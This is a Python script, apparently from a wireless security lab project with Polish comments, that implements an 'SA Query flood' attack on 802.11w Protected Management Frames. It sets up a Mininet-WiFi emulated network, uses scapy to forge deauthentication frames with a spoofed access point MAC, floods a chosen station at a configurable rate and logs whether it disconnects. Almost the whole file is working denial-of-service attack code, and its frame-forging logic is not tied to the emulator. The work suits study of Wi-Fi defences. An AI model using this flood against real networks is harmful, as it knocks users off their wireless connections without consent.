#!/usr/bin/env python3
"""
PMF Bypass — SA Query Flood Attack

Atak na mechanizm Security Association (SA) Query — część PMF (802.11w).

Jak działa SA Query:
  1. Klient odbiera podejrzaną ramkę Robust Management (np. Deauth)
  2. Wysyła SA Query do AP: "czy naprawdę wysłałeś tę ramkę?"
  3. AP odpowiada SA Query Response
  4. Jeśli AP potwierdzi — klient akceptuje ramkę
  5. Jeśli timeout — klient MOŻE zaakceptować ramkę bez weryfikacji

Atak:
  Wysyłamy zalew sfałszowanych ramek Deauth → klient wysyła SA Query za SA Query
  → AP nie nadąża z odpowiedziami → timeout → klient akceptuje niezweryfikowaną
  ramkę i rozłącza się.

Cel: nie sam Deauth (PMF go blokuje), ale wyczerpanie mechanizmu SA Query
     przez flood zapytań.

Usage:
    sudo python3 attacks/sa_query_flood.py
    sudo python3 attacks/sa_query_flood.py --target sta1 --rate 50 --duration 30
"""

import argparse
import os
import sys
import time
from collections import defaultdict
from datetime import datetime

from mn_wifi.net import Mininet_wifi
from mininet.log import setLogLevel, info
from scapy.all import (
    RadioTap, Dot11, Dot11Deauth,
    sendp, sniff, wrpcap,
)

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOSTAPD_CONF = os.path.join(BASE_DIR, "configs", "hostapd.conf")
WPA_CONF = os.path.join(BASE_DIR, "configs", "wpa_supplicant.conf")
RAPORT_DIR = os.path.join(os.path.dirname(BASE_DIR), "raport")


def timestamp():
    return datetime.now().strftime("%Y-%m-%dT%H:%M:%S")


def build_deauth_frame(target_mac, ap_mac, reason=7):
    """
    Buduje ramkę Deauthentication (subtype 12).
    reason=7: Class 3 frame received from nonassociated STA
    """
    frame = RadioTap() / Dot11(
        type=0, subtype=12,         # Management / Deauthentication
        addr1=target_mac,            # Destination = target station
        addr2=ap_mac,                # Source = spoofed AP MAC
        addr3=ap_mac,                # BSSID
    ) / Dot11Deauth(reason=reason)
    return frame


def check_association(sta):
    result = sta.cmd(f"iw dev {sta.name}-wlan0 link")
    return "Not connected" not in result


class SAQueryMonitor:
    """Monitoruje ramki SA Query wysyłane przez stację."""

    def __init__(self):
        self.sa_query_count = 0
        self.sa_query_response_count = 0
        self.events = []  # (timestamp, event_type, details)

    def on_packet(self, pkt):
        if not pkt.haslayer(Dot11):
            return

    def log_event(self, event_type, details=""):
        self.events.append((timestamp(), event_type, details))


def run_sa_query_flood(target_name="sta1", rate=50, duration=30, verify_disconnect=True):
    """
    Główna funkcja ataku SA Query Flood.

    Args:
        target_name: nazwa stacji-celu
        rate: liczba ramek Deauth na sekundę
        duration: czas trwania ataku w sekundach
        verify_disconnect: czy sprawdzić rozłączenie po ataku
    """
    net = Mininet_wifi()

    info(f"[{timestamp()}] === PMF BYPASS: SA Query Flood Attack ===\n")
    info(f"  Target: {target_name}\n")
    info(f"  Rate:   {rate} frames/sec\n")
    info(f"  Duration: {duration}s\n")
    info(f"  Total frames to send: ~{rate * duration}\n")

    # ---- 1. Setup topologii ----
    ap1 = net.addAccessPoint(
        "ap1",
        ssid="PMF_Lab_Secure",
        mode="g",
        channel="6",
        failMode="standalone",
        hostapd_params=["-f", HOSTAPD_CONF],
    )

    sta1 = net.addStation("sta1", wpas_params=["-c", WPA_CONF])
    sta2 = net.addStation("sta2", wpas_params=["-c", WPA_CONF])

    stations = {"sta1": sta1, "sta2": sta2}
    target = stations.get(target_name)
    if target is None:
        info(f"[ERROR] Unknown target: {target_name}\n")
        return False

    net.setPropagationModel(model="logDistance", exp=3.5)
    net.configureNodes()

    net.addLink(ap1, sta1)
    net.addLink(ap1, sta2)

    net.start()
    info(f"\n[{timestamp()}] Waiting for association...\n")
    time.sleep(15)

    # ---- 2. Pre-flight checks ----
    if not check_association(target):
        info(f"[ERROR] {target.name} not associated. Cannot attack.\n")
        net.stop()
        return False

    # Extract MAC from ip link (wintfs.mac = None in this Mininet-WiFi version)
    import re
    def get_mac(node):
        r = node.cmd("ip -c=never link show wlan0")
        m = re.search(r'link/ether ([0-9a-f:]+)', r)
        return m.group(1) if m else "00:00:00:00:00:01"
    target_mac = get_mac(target)
    ap_mac = get_mac(ap1)

    info(f"\n[{timestamp()}] === Pre-Attack Status ===\n")
    info(f"  Target: {target.name} ({target_mac})\n")
    info(f"  AP:     ap1 ({ap_mac})\n")
    info(f"  Associated: YES\n")

    # ---- 3. SA Query Flood ----
    info(f"\n[{timestamp()}] === Starting SA Query Flood ===\n")

    deauth_frame = build_deauth_frame(target_mac, ap_mac, reason=7)
    iface = "wlan0"  # Inside Mininet namespace, interface is wlan0

    # Licznik wysłanych ramek
    sent_count = 0
    start_time = time.time()
    end_time = start_time + duration

    # Interwał między ramkami (sekundy)
    interval = 1.0 / rate if rate > 0 else 0

    # Monitor stanu co 5 sekund
    last_status_time = start_time

    # Build scapy command to run INSIDE namespace via target.cmd()
    scapy_send_cmd = (
        'python3 -c "'
        'from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp;'
        f"frame = RadioTap()/Dot11(type=0,subtype=12,addr1='{target_mac}',addr2='{ap_mac}',addr3='{ap_mac}')/Dot11Deauth(reason=7);"
        f"sendp(frame, iface='{iface}', count=10, inter=0.01, verbose=False);"
        'print(''OK'')"'
    )

    try:
        while time.time() < end_time:
            # Run scapy INSIDE the namespace via target.cmd()
            result = target.cmd(scapy_send_cmd)
            if 'OK' in result:
                sent_count += 10

            # Status update co ~5s
            now = time.time()
            if now - last_status_time >= 5:
                elapsed = now - start_time
                actual_rate = sent_count / elapsed if elapsed > 0 else 0
                still_connected = check_association(target)
                info(f"  [{timestamp()}] Sent: {sent_count}, "
                     f"Rate: {actual_rate:.0f}/s, "
                     f"Connected: {still_connected}\n")
                last_status_time = now

            time.sleep(interval * 10)

    except KeyboardInterrupt:
        info(f"\n[{timestamp()}] Attack interrupted by user\n")

    actual_duration = time.time() - start_time
    actual_rate = sent_count / actual_duration if actual_duration > 0 else 0

    # ---- 4. Post-attack status ----
    time.sleep(3)  # Dajemy czas na ewentualne rozłączenie

    info(f"\n[{timestamp()}] === Post-Attack Status ===\n")

    post_associated = check_association(target)
    info(f"  Frames sent:     {sent_count}\n")
    info(f"  Duration:        {actual_duration:.1f}s\n")
    info(f"  Actual rate:     {actual_rate:.1f} frames/s\n")
    info(f"  Target connected: {post_associated}\n")

    # ---- 5. Analysis ----
    info(f"\n[{timestamp()}] === Analysis ===\n")

    if not post_associated and verify_disconnect:
        info(f"[SUCCESS] Station DISCONNECTED after SA Query flood.\n")
        info(f"          SA Query mechanism may have timed out.\n")
        info(f"          {sent_count} deauth frames flooded the SA Query channel.\n")
        attack_result = "STATION_DISCONNECTED"
    elif post_associated:
        info(f"[PASS] Station remained connected.\n")
        info(f"       PMF protection held — SA Query flood did not cause disconnect.\n")
        info(f"       AP handled {sent_count} deauth attempts without issue.\n")
        attack_result = "STATION_REMAINED"
    else:
        info(f"[UNKNOWN] Station status unclear.\n")
        attack_result = "UNKNOWN"

    # ---- 6. Save evidence ----
    os.makedirs(os.path.join(RAPORT_DIR, "logs"), exist_ok=True)
    log_path = os.path.join(
        RAPORT_DIR, "logs",
        f"sa_query_flood_{target_name}_rate{rate}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    )
    with open(log_path, "w") as f:
        f.write(f"SA Query Flood Attack Log\n")
        f.write(f"{'='*60}\n")
        f.write(f"Target:    {target_name} ({target_mac})\n")
        f.write(f"AP:        {ap_mac}\n")
        f.write(f"Rate:      {rate} frames/s (configured)\n")
        f.write(f"Duration:  {actual_duration:.1f}s\n")
        f.write(f"Sent:      {sent_count} frames\n")
        f.write(f"Actual rate:{actual_rate:.1f} frames/s\n")
        f.write(f"Result:    {attack_result}\n")
    info(f"  Log saved: {log_path}\n")

    net.stop()

    return attack_result == "STATION_DISCONNECTED"


def parse_args():
    parser = argparse.ArgumentParser(
        description="PMF Bypass: SA Query Flood Attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 attacks/sa_query_flood.py
  sudo python3 attacks/sa_query_flood.py --target sta1 --rate 100 --duration 60
  sudo python3 attacks/sa_query_flood.py --target sta2 --rate 20 --duration 15
        """,
    )
    parser.add_argument("--target", default="sta1",
                        help="Target station (sta1, sta2)")
    parser.add_argument("--rate", type=int, default=50,
                        help="Deauth frames per second")
    parser.add_argument("--duration", type=int, default=30,
                        help="Attack duration in seconds")
    parser.add_argument("--no-verify", action="store_true",
                        help="Skip disconnect verification")
    return parser.parse_args()


if __name__ == "__main__":
    setLogLevel("info")
    args = parse_args()
    success = run_sa_query_flood(
        target_name=args.target,
        rate=args.rate,
        duration=args.duration,
        verify_disconnect=not args.no_verify,
    )
    sys.exit(0 if success else 1)
